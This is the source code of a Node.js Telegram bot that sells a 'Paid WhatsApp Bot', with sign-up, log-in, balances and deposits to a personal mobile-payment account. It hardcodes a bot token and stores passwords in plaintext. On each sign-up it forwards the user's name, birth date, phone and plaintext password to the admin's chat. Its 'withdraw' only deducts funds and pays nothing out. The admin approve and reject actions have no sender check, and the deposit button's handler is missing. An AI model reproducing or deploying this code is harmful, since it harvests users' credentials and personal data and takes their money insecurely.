const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');

// ===== BOT =====
const bot = new Telegraf('8226474686:AAEmXiWRGoeaa5pZpF2MZlYViYmSkM70fbI');
const ADMIN_ID = 6012422087;

// ===== DATABASE =====
const DATA_FILE = './users.json';
let users = {};

if (fs.existsSync(DATA_FILE)) {
    users = JSON.parse(fs.readFileSync(DATA_FILE));
}

function saveUsers() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
}

const sessions = {};
const PASSWORD_REGEX = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/;

// ===== DATE & TIME (Pakistan Time) =====
function getCurrentDateTime() {
    const d = new Date();
    const utc = d.getTime() + d.getTimezoneOffset() * 60000; // UTC in ms
    const pakistanTime = new Date(utc + 5 * 60 * 60 * 1000); // UTC+5

    const date = `${String(pakistanTime.getDate()).padStart(2,'0')}-${String(pakistanTime.getMonth()+1).padStart(2,'0')}-${pakistanTime.getFullYear()}`;
    const time = `${String(pakistanTime.getHours()).padStart(2,'0')}:${String(pakistanTime.getMinutes()).padStart(2,'0')}:${String(pakistanTime.getSeconds()).padStart(2,'0')}`;

    return { date, time };
}

// ======= Back Button Helper =======
function withBackButton(buttons = []) {
    return Markup.inlineKeyboard([
        ...buttons,
        [Markup.button.callback('⬅️ Back', 'backToMenu')]
    ]);
}

// ======= START =======
bot.start(async (ctx) => {
    const chatId = ctx.chat.id;
    const session = sessions[chatId];

    if (session && session.usernameKey && users[session.usernameKey]) {
        const user = users[session.usernameKey];
        return ctx.reply(
            `Dear ${user.firstName}, Welcome Back To Paid WhatsApp Bot`,
            withBackButton([
                [Markup.button.callback('Check Balance', 'checkBalance')],
                [Markup.button.callback('Buy Bot', 'buyBot')],
                [Markup.button.callback('Deposit Balance', 'depositBalance')],
                [Markup.button.callback('Withdraw Balance', 'withdrawBalance')],
                [Markup.button.callback('Log Out', 'logOut')]
            ])
        );
    }

    await ctx.reply(
        '👋 Welcome!\n\nPlease Sign Up or Log In:',
        Markup.inlineKeyboard([
            Markup.button.callback('Sign Up', 'signup'),
            Markup.button.callback('Log In', 'login')
        ])
    );
});

// ======= BUTTON ACTIONS =======
bot.action('signup', async (ctx) => {
    sessions[ctx.chat.id] = { flow: 'signup', step: 'firstName' };
    await ctx.reply('Enter your first name:');
});

bot.action('login', async (ctx) => {
    sessions[ctx.chat.id] = { flow: 'login', step: 'loginUsername' };
    await ctx.reply('Enter your username:');
});

bot.action('forgotPassword', async (ctx) => {
    await ctx.reply('Password recovery not supported.\nPlease create a new account.');
});

// ======= TEXT HANDLER =======
bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    const text = ctx.message.text.trim();
    const session = sessions[chatId];
    if (!session) return;

    // ===== SIGNUP FLOW =====
    if (session.flow === 'signup') {
        switch (session.step) {
            case 'firstName':
                session.firstName = text;
                session.step = 'dob';
                return ctx.reply('Enter DOB (DD-MM-YYYY):');

            case 'dob': {
                const m = text.match(/^(\d{2})-(\d{2})-(\d{4})$/);
                if (!m) return ctx.reply('Invalid format. Example: 31-01-2000');
                const d = new Date(+m[3], +m[2] - 1, +m[1]);
                if (d.getDate() !== +m[1]) return ctx.reply('Invalid date.');

                const age = new Date().getFullYear() - d.getFullYear();
                if (age < 14 || age > 55) return ctx.reply('Age must be between 14 and 55.');

                session.dob = text;
                session.step = 'phone';
                return ctx.reply('Enter phone with country code (+923001234567):');
            }

            case 'phone': {
                if (!/^\+?[1-9]\d{9,14}$/.test(text)) {
                    return ctx.reply('Invalid phone number.');
                }
                session.phone = text;
                session.step = 'username';
                return ctx.reply('Create username (lowercase letters, numbers, underscore):');
            }

            case 'username':
                if (!/^[a-z0-9_]{3,15}$/.test(text)) {
                    return ctx.reply('Invalid username format. Use lowercase letters, numbers, underscore (_). Example: wasi123');
                }
                if (users[text]) {
                    return ctx.reply('Already Taken. Try Another.');
                }
                session.username = text;
                session.step = 'password';
                return ctx.reply('Enter your password (8+ chars, must include uppercase, lowercase, number):');

            case 'password':
                if (!PASSWORD_REGEX.test(text)) {
                    return ctx.reply('Weak password. Try again.');
                }
                session.password = text;
                session.step = 'confirmPassword';
                return ctx.reply('Confirm password:');

            case 'confirmPassword':
                if (text !== session.password) {
                    session.step = 'password';
                    return ctx.reply('Passwords do not match. Enter again:');
                }

                users[session.username] = {
                    firstName: session.firstName,
                    dob: session.dob,
                    phone: session.phone,
                    password: session.password,
                    registered: getCurrentDateTime().date,
                    balance: 0,
                    transactions: []
                };

                saveUsers();
                sessions[chatId] = null;

                await ctx.reply(
                    '🎉 Account Created Successfully',
                    Markup.inlineKeyboard([
                        [Markup.button.callback('Log In', 'login')]
                    ])
                );

                const { date, time } = getCurrentDateTime();
                const adminMsg = `
🆕 NEW ACCOUNT
👤 Name: ${session.firstName} 🎂 DOB: ${session.dob} 📞 Phone: ${session.phone} 👤 Username: ${session.username} 🔑 Password: ${session.password} 📅 Date: ${date} Time: ${time}
📲 Telegram: @${ctx.from.username || 'Not Set'} [https://t.me/${ctx.from.username || 'user?id=' + chatId}]
`;
                await bot.telegram.sendMessage(ADMIN_ID, adminMsg);
                break;
        }
    }

    // ===== LOGIN FLOW =====
    if (session.flow === 'login') {
        switch (session.step) {
            case 'loginUsername':
                if (!users[text]) {
                    return ctx.reply(
                        'Username not found.',
                        Markup.inlineKeyboard([
                            [Markup.button.callback('Sign Up', 'signup')],
                            [Markup.button.callback('⬅️ Back', 'backToMenu')]
                        ])
                    );
                }
                session.user = users[text];
                session.usernameKey = text;
                session.step = 'loginPassword';
                return ctx.reply('Enter password:');

            case 'loginPassword':
                if (text !== session.user.password) {
                    return ctx.reply('Incorrect password.');
                }

                sessions[chatId] = { user: session.user, usernameKey: session.usernameKey };

                return ctx.reply(
                    `Dear ${session.user.firstName}, Welcome To Paid WhatsApp Bot`,
                    withBackButton([
                        [Markup.button.callback('Check Balance', 'checkBalance')],
                        [Markup.button.callback('Buy Bot', 'buyBot')],
                        [Markup.button.callback('Deposit Balance', 'depositBalance')],
                        [Markup.button.callback('Withdraw Balance', 'withdrawBalance')],
                        [Markup.button.callback('Log Out', 'logOut')]
                    ])
                );
        }
    }

    // ===== DEPOSIT FLOW TEXT =====
    if (session.flow === 'deposit') {
        if (session.step === 'enterDepositAmount') {
            const amount = parseFloat(text);
            if (isNaN(amount) || amount <= 0) return ctx.reply('❌ Invalid amount. Enter a valid number.');

            session.depositAmount = amount;
            session.step = 'paymentOption';
            return ctx.reply(
                `💰 Deposit Amount: ${amount} PKR\nSelect payment method:`,
                Markup.inlineKeyboard([
                    [Markup.button.callback('JazzCash', 'payJazzCash')],
                    [Markup.button.callback('EasyPaisa', 'payEasyPaisa')],
                    [Markup.button.callback('U-Paisa', 'payUPaisa')],
                    [Markup.button.callback('Raast', 'payRaast')],
                    [Markup.button.callback('⬅️ Back', 'backToMenu')]
                ])
            );
        }

        if (session.step === 'awaitingPaymentProof') {
            session.transactionId = text;
            session.step = 'processingFunds';

            await ctx.reply('⏳ Wait! Your fund updating is in process. Please wait...', withBackButton([]));

            const user = users[session.usernameKey];
            const adminMsg = `
🆕 Deposit Request
👤 User: ${user.firstName} (@${ctx.from.username || 'Not Set'})
💰 Amount: ${session.depositAmount} PKR
💳 Payment Method: ${session.paymentMethod}
🔖 Transaction ID: ${session.transactionId}
            `;
            await bot.telegram.sendMessage(
                ADMIN_ID,
                adminMsg,
                Markup.inlineKeyboard([
                    [Markup.button.callback('✅ Approve', `approve_${chatId}`)],
                    [Markup.button.callback('❌ Reject', `reject_${chatId}`)]
                ])
            );
        }
    }
});

// ===== PAYMENT METHOD BUTTONS =====
const PAYMENT_METHODS = {
    payJazzCash: 'JazzCash',
    payEasyPaisa: 'EasyPaisa',
    payUPaisa: 'U-Paisa',
    payRaast: 'Raast'
};

Object.keys(PAYMENT_METHODS).forEach(action => {
    bot.action(action, async (ctx) => {
        const session = sessions[ctx.chat.id];
        if (!session || !session.usernameKey) return ctx.reply('Please login first.');

        session.paymentMethod = PAYMENT_METHODS[action];
        session.step = 'awaitingPaymentProof';

        await ctx.reply(
`💳 Send Payment Using ${session.paymentMethod}
🏦 Account Title: M Hadi
📱 Account Number: 03000382844
💳 Account Type: ${session.paymentMethod}

Please enter transaction ID or send screenshot:`,
            withBackButton([])
        );
    });
});

// ===== ADMIN APPROVE / REJECT =====
bot.action(/approve_(\d+)/, async (ctx) => {
    const userChatId = ctx.match[1];
    const session = sessions[userChatId];
    if (!session || !session.usernameKey) return ctx.reply('Session expired.');

    const user = users[session.usernameKey];
    user.balance = (user.balance || 0) + session.depositAmount;
    if (!user.transactions) user.transactions = [];
    const { date, time } = getCurrentDateTime();
    user.transactions.push({
        type: 'Deposit ➕',
        amount: session.depositAmount,
        date,
        time,
        paymentMethod: session.paymentMethod,
        transactionId: session.transactionId
    });
    saveUsers();

    await bot.telegram.sendMessage(userChatId, `✅ Your fund of ${session.depositAmount} PKR has been successfully approved!`, withBackButton([]));
    await ctx.editMessageText('✅ Deposit Approved ✅');
    sessions[userChatId] = null;
});

bot.action(/reject_(\d+)/, async (ctx) => {
    const userChatId = ctx.match[1];
    const session = sessions[userChatId];
    if (!session || !session.usernameKey) return ctx.reply('Session expired.');

    await bot.telegram.sendMessage(userChatId, `❌ Your fund update of ${session.depositAmount} PKR has been rejected by admin.`, withBackButton([]));
    await ctx.editMessageText('❌ Deposit Rejected ❌');
    sessions[userChatId] = null;
});

// ===== OTHER BUTTON ACTIONS =====
bot.action('checkBalance', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    const { date, time } = getCurrentDateTime();

    return ctx.reply(
        `Dear Customer, Your Account Balance Is: ${user.balance || 0} PKR On Account: ${user.firstName} Date: ${date} Time: ${time}`,
        Markup.inlineKeyboard([
            [Markup.button.callback('📜 View Transaction History', 'viewTransactions')],
            [Markup.button.callback('⬅️ Back', 'backToMenu')]
        ])
    );
});

bot.action('withdrawBalance', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    const amount = 200;
    if ((user.balance || 0) < amount) {
        return ctx.reply(`❌ Not Enough Balance To Withdraw ${amount} PKR`, withBackButton([]));
    }

    user.balance -= amount;
    if (!user.transactions) user.transactions = [];
    const { date, time } = getCurrentDateTime();
    user.transactions.push({
        type: 'Withdraw ➖',
        amount: amount,
        date,
        time
    });
    saveUsers();
    return ctx.reply(`✅ ${amount} PKR Withdrawn Successfully`, withBackButton([]));
});

bot.action('buyBot', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    const cost = 100;
    if ((user.balance || 0) < cost) {
        return ctx.reply(`❌ Not Enough Balance To Buy Bot (Cost: ${cost} PKR)`, withBackButton([]));
    }

    user.balance -= cost;
    if (!user.transactions) user.transactions = [];
    const { date, time } = getCurrentDateTime();
    user.transactions.push({
        type: 'Buy Bot ➖',
        amount: cost,
        date,
        time
    });
    saveUsers();
    return ctx.reply(`✅ Bot Purchased! ${cost} PKR Deducted`, withBackButton([]));
});

bot.action('viewTransactions', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) return ctx.reply('Please login first.');

    const user = users[session.usernameKey];
    if (!user.transactions || user.transactions.length === 0) {
        return ctx.reply('No transactions found.', withBackButton([]));
    }

    let historyMsg = '📜 Transaction History:\n\n';
    user.transactions.forEach((t, i) => {
        historyMsg += `${i + 1}. ${t.type}: ${t.amount} PKR on ${t.date} at ${t.time}\n`;
    });

    return ctx.reply(historyMsg, withBackButton([]));
});

bot.action('logOut', async (ctx) => {
    sessions[ctx.chat.id] = null;
    return ctx.reply('🔓 You have been logged out.', withBackButton([]));
});

bot.action('backToMenu', async (ctx) => {
    const session = sessions[ctx.chat.id];
    if (!session || !session.usernameKey) {
        return ctx.reply(
            '👋 Welcome!\n\nPlease Sign Up or Log In:',
            Markup.inlineKeyboard([
                Markup.button.callback('Sign Up', 'signup'),
                Markup.button.callback('Log In', 'login')
            ])
        );
    } else {
        const user = users[session.usernameKey];
        return ctx.reply(
            `Dear ${user.firstName}, Welcome To Paid WhatsApp Bot`,
            withBackButton([
                [Markup.button.callback('Check Balance', 'checkBalance')],
                [Markup.button.callback('Buy Bot', 'buyBot')],
                [Markup.button.callback('Deposit Balance', 'depositBalance')],
                [Markup.button.callback('Withdraw Balance', 'withdrawBalance')],
                [Markup.button.callback('Log Out', 'logOut')]
            ])
        );
    }
});

// ===== LAUNCH =====
bot.launch();
console.log('Bot running...');
